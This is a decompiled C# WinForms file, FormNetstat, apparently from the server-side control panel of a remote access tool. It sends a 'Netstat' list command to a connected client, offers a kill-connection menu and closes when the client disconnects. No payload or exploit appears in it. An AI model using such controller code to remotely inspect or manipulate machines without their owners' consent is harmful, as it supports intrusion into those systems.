using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000051 RID: 81
	public partial class FormNetstat : DarkForm
	{
		// Token: 0x17000099 RID: 153
		// (get) Token: 0x0600031A RID: 794 RVA: 0x000199F4 File Offset: 0x000199F4
		// (set) Token: 0x0600031B RID: 795 RVA: 0x000199FC File Offset: 0x000199FC
		public Form1 F { get; set; }

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x0600031C RID: 796 RVA: 0x00019A08 File Offset: 0x00019A08
		// (set) Token: 0x0600031D RID: 797 RVA: 0x00019A10 File Offset: 0x00019A10
		internal Clients Client { get; set; }

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x0600031E RID: 798 RVA: 0x00019A1C File Offset: 0x00019A1C
		// (set) Token: 0x0600031F RID: 799 RVA: 0x00019A24 File Offset: 0x00019A24
		internal Clients ParentClient { get; set; }

		// Token: 0x06000320 RID: 800 RVA: 0x00019A30 File Offset: 0x00019A30
		public FormNetstat()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000321 RID: 801 RVA: 0x00019A40 File Offset: 0x00019A40
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000322 RID: 802 RVA: 0x00019AA0 File Offset: 0x00019AA0
		private void killToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormNetstat.<killToolStripMenuItem_Click>d__14 <killToolStripMenuItem_Click>d__;
			<killToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<killToolStripMenuItem_Click>d__.<>4__this = this;
			<killToolStripMenuItem_Click>d__.<>1__state = -1;
			<killToolStripMenuItem_Click>d__.<>t__builder.Start<FormNetstat.<killToolStripMenuItem_Click>d__14>(ref <killToolStripMenuItem_Click>d__);
		}

		// Token: 0x06000323 RID: 803 RVA: 0x00019ADC File Offset: 0x00019ADC
		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Netstat";
				msgPack.ForcePathObject("Option").AsString = "List";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			});
		}

		// Token: 0x06000324 RID: 804 RVA: 0x00019AF0 File Offset: 0x00019AF0
		private void FormNetstat_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}
	}
}
